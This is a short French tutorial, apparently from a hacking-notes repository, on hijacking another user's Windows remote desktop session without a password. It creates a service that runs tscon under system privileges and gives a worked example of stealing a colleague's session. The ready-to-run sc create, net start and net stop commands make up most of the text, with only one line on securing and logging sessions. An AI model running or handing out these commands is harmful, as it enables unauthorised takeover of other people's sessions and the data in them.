# Hijack session pc distant avec la faille tscon

# tscon
Cette commande est utilisée pour se connecter sur une autre session d'un PC distant (serveur par ex.).
Elle nécessite le nom de destination et l'ID de session pour s'exécuter.

# query user
Cette commande permet d'afficher la liste et informations de session de tous les utilisateurs s'ayant déjà connecté au serveur distant.
Utile ici pour récupérer le nom de destination et l'ID de session à hijacker.

# service
Cette commande permet de voler (hijacker) la session de n'importe quelle cible, sans mot de passe (password bypassing) :
*<process_name> est le nom du service à créer (nom bidon, aucune importance, faudra juste arrêter le service avec le meme nom ensuite)
<user 2_ID> est l'**ID** (numéro d'identification) de la **session-cible**, celle à hijacker
<session_name> est le nom de **votre** session*
```
sc create <process_name> binpath= "cmd.exe /k tscon <user 2_ID> /dest:<session_name>"
```

# Exemple
commande query user à lancer dans un terminal (cmd, powershell...) :
![query user](https://github.com/Sefiria/ConseilHack/blob/4f5599508ecff62dee4d58175405257ac78a1636/Documentation/En%20vrac/res/Hijack%20session%20pc%20distant%20annexe.png)

Exécuter ensuite la commande du paragraphe "service" ainsi que celle pour démarrer le service, exemple ici :
*Nous sommes dans cet exemple Titi, et souhaitons voler la session de Toto
*<process_name> = hijack (nom du service - le nom n'a pas d'importance)
<user 2_ID> = 8 (ID de la session-cible)
<session_name> = rdp-tcp#1 (nom de notre session actuelle)*
```
sc create hijack binpath= "cmd.exe /k tscon 8 /dest:rdp-tcp#1"
net start hijack
```
**Félicitations, vous venez d'Hijacker une session distante via une faille de tscon exécuté par service sans mot de passe.**
Comprenez alors l'importance de sécuriser, logger les sessions utilisateurs.
**N'oubliez pas de stopper le service une fois avoir fini avec la commande *net stop <process_name>*** :
```
net stop hijack
```
